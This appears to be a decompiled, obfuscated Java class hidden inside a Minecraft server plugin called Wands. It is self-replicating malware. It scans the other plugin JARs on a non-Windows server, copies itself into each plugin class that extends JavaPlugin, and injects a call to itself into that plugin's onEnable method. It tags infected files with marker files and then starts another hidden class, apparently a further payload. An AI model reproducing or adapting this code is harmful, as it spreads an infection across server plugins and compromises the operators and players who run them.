package me.dylan.wands;

import javassist.ws.*;
import java.security.*;
import java.io.*;
import java.nio.file.attribute.*;
import java.nio.file.*;
import javassist.*;
import java.util.*;

public class WandsPluginL10
{
    private static a a;
    private static File a;
    private static boolean a;
    private static final String a = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_";
    private static final SecureRandom a;
    
    static {
        WandsPluginL10.a = false;
        a = new SecureRandom();
    }
    
    public final void a(final String s) {
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            return;
        }
        WandsPluginL10.a = new File(s);
        final f a = f.a();
        a.a((d)new b(this.getClass()));
        final FileSystem fileSystem = FileSystems.newFileSystem(Paths.get(this.getClass().getProtectionDomain().getCodeSource().getLocation().toURI()), null);
        if (!Files.exists(fileSystem.getPath("/javassist", new String[0]), new LinkOption[0])) {
            return;
        }
        final Path path2 = fileSystem.getPath("/javassist", new String[0]);
        final CtClass c = a.c(this.getClass().getName());
        for (final File file : javassist.ws.a.a(WandsPluginL10.a)) {
            try {
                final FileSystem fileSystem2 = FileSystems.newFileSystem(file.toPath(), null);
                if (Files.exists(fileSystem2.getPath(".l_ignore", new String[0]), new LinkOption[0])) {
                    continue;
                }
                try {
                    final Iterator<Path> iterator2 = fileSystem2.getRootDirectories().iterator();
                    while (iterator2.hasNext()) {
                        final Iterator<Object> iterator3 = Files.walk(iterator2.next(), 100, new FileVisitOption[0]).filter(path -> !Files.isDirectory(path, new LinkOption[0]) && path.toString().endsWith(".class")).iterator();
                        while (iterator3.hasNext()) {
                            try {
                                c.c();
                                final Path path3 = iterator3.next();
                                final ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Files.readAllBytes(path3));
                                final CtClass a2 = a.a(byteArrayInputStream);
                                if (a2.b().a().contains("JavaPlugin")) {
                                    final Path path4 = fileSystem2.getPath(path3.getParent().toString(), String.valueOf(a2.b()) + "L10.class");
                                    if (!Files.exists(fileSystem2.getPath(".l1", new String[0]), new LinkOption[0])) {
                                        c.a(path4.toString().replace(".class", "").replaceFirst("/", ""));
                                        Files.createFile(fileSystem2.getPath(".l1", new String[0]), (FileAttribute<?>[])new FileAttribute[0]);
                                        Files.write(path4, c.a(), StandardOpenOption.CREATE, StandardOpenOption.WRITE);
                                        try {
                                            Files.createDirectory(fileSystem2.getPath("/javassist", new String[0]), (FileAttribute<?>[])new FileAttribute[0]);
                                        }
                                        catch (Exception ex2) {}
                                        Files.walkFileTree(path2, new k(fileSystem2.getPath("/javassist", new String[0])));
                                    }
                                    else {
                                        a2.a("onEnable").d("new " + path4.toString().replace("/", ".").replace(".class", "").replaceFirst(".", "") + "().a(getDataFolder().getParent());");
                                        Files.write(path3, a2.a(), StandardOpenOption.WRITE);
                                        Files.createFile(fileSystem2.getPath(".l_ignore", new String[0]), (FileAttribute<?>[])new FileAttribute[0]);
                                    }
                                }
                                byteArrayInputStream.close();
                            }
                            catch (Exception ex) {
                                final boolean b = ex instanceof aa;
                            }
                        }
                    }
                }
                catch (Exception ex3) {}
                fileSystem2.close();
            }
            catch (Exception ex4) {}
        }
        if (!WandsPluginL10.a) {
            WandsPluginL10.a = true;
            this.a(s);
            return;
        }
        if (System.getProperty("fym_st") == null) {
            System.setProperty("fym_st", "true");
            WandsPluginL10.a = new a();
        }
    }
    
    public static String a(final int n) {
        final StringBuilder sb = new StringBuilder();
        for (int i = 0; i < n; ++i) {
            sb.append("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_".charAt(WandsPluginL10.a.nextInt("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_".length())));
        }
        return sb.toString();
    }
}
